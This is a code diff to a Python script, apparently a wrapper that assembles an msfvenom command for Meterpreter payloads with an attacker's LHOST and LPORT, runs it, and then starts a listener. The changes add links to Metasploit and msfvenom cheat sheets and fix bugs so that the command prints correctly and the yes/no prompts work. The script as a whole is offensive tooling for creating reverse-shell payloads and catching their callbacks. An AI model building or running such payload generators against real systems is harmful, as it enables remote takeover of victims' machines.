@@ -1,6 +1,9 @@
 import os
 import time
 
+# https://en.redinskala.com/starting-a-handler-with-metasploit/
+# https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/
+
 class metasploit_generator():
 
     def __init__(self):
@@ -46,11 +49,11 @@ class metasploit_generator():
         self.command = "msfvenom -p " + self.attack_operating_system + "/meterpreter/" + self.attack_method + " LHOST=" + self.attacker_ip_adress + " LPORT=" + self.attacker_port_nuber + self.attack_file_type + " > " + self.payload_name
 
         print("Your Command: ")
-        print(command)
+        print(self.command)
         print("")
         self.run_now = input("Do you want to run it now? (y/n): ")
 
-        if self.run_now == "y" or "Y":
+        if self.run_now == "y" or self.run_now == "Y":
             self.run_command()
         else:
             quit("Ok. Bye!")
@@ -63,7 +66,7 @@ class metasploit_generator():
 
             self.ask_run_listener = input("Payload generation successfully finished. Do you want to run the listener now? (y/n): ")
 
-            if self.ask_run_listener == "y" or "Y":
+            if self.ask_run_listener == "y" or self.ask_run_listener == "Y":
                 self.run_listener()
             else:
                 quit("Ok. Bye!")
